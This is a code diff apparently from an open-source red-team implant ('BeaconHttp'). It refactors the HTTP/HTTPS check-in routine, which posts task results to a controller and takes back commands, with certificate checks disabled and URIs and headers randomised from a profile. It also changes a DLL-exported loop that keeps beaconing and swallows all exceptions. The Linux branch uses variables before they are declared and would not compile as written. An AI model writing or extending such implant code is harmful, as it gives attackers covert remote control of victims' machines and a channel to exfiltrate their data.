@@ -105,34 +105,19 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
     HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;
 
     // Use WinHttpOpen to obtain a session handle.
-    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
-                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                            WINHTTP_NO_PROXY_NAME,
-                            WINHTTP_NO_PROXY_BYPASS, 
-                            0);
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     // Specify an HTTP server.
     if (hSession)
-        hConnect = WinHttpConnect(hSession, 
-                                    sdomain.c_str(), 
-                                    port, 
-                                    0);
+        hConnect = WinHttpConnect(hSession, sdomain.c_str(), port, 0);
 
     // Create an HTTP request handle.
     DWORD dwFlags = 0;
     if(isHttps)
-    {
         dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;
-    }
 
     if (hConnect)
-        hRequest = WinHttpOpenRequest(hConnect, 
-                                        L"POST", 
-                                        surl.c_str(),
-                                        NULL, 
-                                        WINHTTP_NO_REFERER,
-                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                        dwFlags);
+        hRequest = WinHttpOpenRequest(hConnect, L"POST", surl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
 
     // Add a request header.
     if( hRequest )
@@ -149,10 +134,7 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
 
             std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());
 
-            bResults = WinHttpAddRequestHeaders( hRequest, 
-                                                stemp.c_str(),
-                                                (ULONG)-1L,
-                                                WINHTTP_ADDREQ_FLAG_ADD );
+            bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
         }
     }
 
@@ -182,13 +164,7 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
 
     // Send a request.
     if (hRequest)
-        bResults = WinHttpSendRequest(hRequest,
-            WINHTTP_NO_ADDITIONAL_HEADERS, 
-            0,
-            (LPVOID)pdata,
-            lenData,
-            lenData,
-            0);
+        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)pdata, lenData, lenData, 0);
 
     // if (!bResults)
     //     printf("Error %d has occurred.\n", GetLastError());
@@ -200,10 +176,8 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
     DWORD dwStatusCode = 0;
     dwSize = sizeof(dwStatusCode);
 
-    WinHttpQueryHeaders(hRequest,
-        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-        WINHTTP_HEADER_NAME_BY_INDEX,
-        &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
+    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
+
 
     // Keep checking for data until there is nothing left.
     string response;
@@ -237,7 +211,7 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
 				}
                 else
                 {
-                    //printf("%s", pszOutBuffer);
+                    // printf("%s", pszOutBuffer);
                     response = response + string(pszOutBuffer);
                 }
 
@@ -270,6 +244,7 @@ BeaconHttp::BeaconHttp(std::string& ip, int port, bool isHttps)
 	: Beacon(ip, port)
     , m_isHttps(isHttps)
 {
+    srand(time(NULL));
 }
 
 
@@ -283,71 +258,41 @@ void BeaconHttp::checkIn()
     
 #ifdef __linux__
 
+    httplib::Client cli(m_ip, m_port);
+
     if(m_isHttps)
+        cli.enable_server_certificate_verification(false);
+
+    std::string output;
+    taskResultsToCmd(output);
+
+    json httpUri = BeaconHttpConfig["http-post"]["uri"];
+    if(m_isHttps)
+        httpsUri = BeaconHttpConfig["https-post"]["uri"];
+
+    std::string endPoint = httpUri[ rand() % httpUri.size() ];
+
+    json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
+    if(m_isHttps)
+        httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];
+
+    httplib::Headers httpClientHeaders;
+    for (auto& it : httpHeaders.items())
+        httpClientHeaders.insert({(it).key(), (it).value()});
+    res.headers = httpClientHeaders;
+
+    if (auto res = cli.Post(endPoint, httpClientHeaders, output))
     {
-        httplib::SSLClient cli(m_ip, m_port);
-	    cli.enable_server_certificate_verification(false);
-
-        std::string output;
-        taskResultsToCmd(output);
-
-        auto httpsUri = BeaconHttpConfig["https-post"]["uri"];
-        srand(time(NULL));
-        std::string httpsUri = httpsUri[ rand() % httpUri.size() ];
-
-        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
-        if(m_isHttps)
-            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];
-
-        httplib::Headers httpClientHeaders;
-        for (auto& it : httpHeaders.items())
-            httpClientHeaders.insert({(it).key(), (it).value()});
-        res.headers = httpClientHeaders;
-
-        if (auto res = cli.Post(httpsUri, httpClientHeaders, output)
+        if (res->status == 200) 
         {
-            if (res->status == 200) 
+            std::string input = res->body;
+            if(!input.empty())
             {
-                std::string input = res->body;
-                if(!input.empty())
-                {
-                    cmdToTasks(input);
-                }
+                cmdToTasks(input);
             }
         }
     }
-    else
-    {
-        httplib::Client cli(m_ip, m_port);
 
-        std::string output;
-        taskResultsToCmd(output);
-
-        auto httpUri = BeaconHttpConfig["http-post"]["uri"];
-        srand(time(NULL));
-        std::string endPoint = httpUri[ rand() % httpUri.size() ];
-
-        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
-        if(m_isHttps)
-            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];
-
-        httplib::Headers httpClientHeaders;
-        for (auto& it : httpHeaders.items())
-            httpClientHeaders.insert({(it).key(), (it).value()});
-        res.headers = httpClientHeaders;
-
-        if (auto res = cli.Post(endPoint, httpClientHeaders, output))
-        {
-            if (res->status == 200) 
-            {
-                std::string input = res->body;
-                if(!input.empty())
-                {
-                    cmdToTasks(input);
-                }
-            }
-        }
-    }
 
 #elif _WIN32
 
@@ -356,15 +301,11 @@ void BeaconHttp::checkIn()
     if(m_isHttps)
     {
         auto httpsUri = BeaconHttpConfig["https-post"]["uri"];
-        
-        srand(time(NULL));
         endPoint = httpsUri[ rand() % httpsUri.size() ];
     }
     else
     {
         auto httpUri = BeaconHttpConfig["http-post"]["uri"];
-
-        srand(time(NULL));
         endPoint = httpUri[ rand() % httpUri.size() ];
     }
 
@@ -424,11 +365,22 @@ extern "C" __declspec(dllexport) int go(PCHAR argv)
         bool exit = false;
         while (!exit)
         {
-            beacon->checkIn();
+            try 
+            {
+                beacon->checkIn();
 
-            exit = beacon->runTasks();
-
-            beacon->sleep();
+                exit = beacon->runTasks();
+                
+                beacon->sleep();
+            }
+            catch(const std::exception& ex)
+            {
+                // std::cout << "Exeption " << ex.what() << std::endl;
+            }
+            catch (...) 
+            {
+                // std::cout << "Exeption" << std::endl;
+            }
         }
 
         beacon->checkIn();
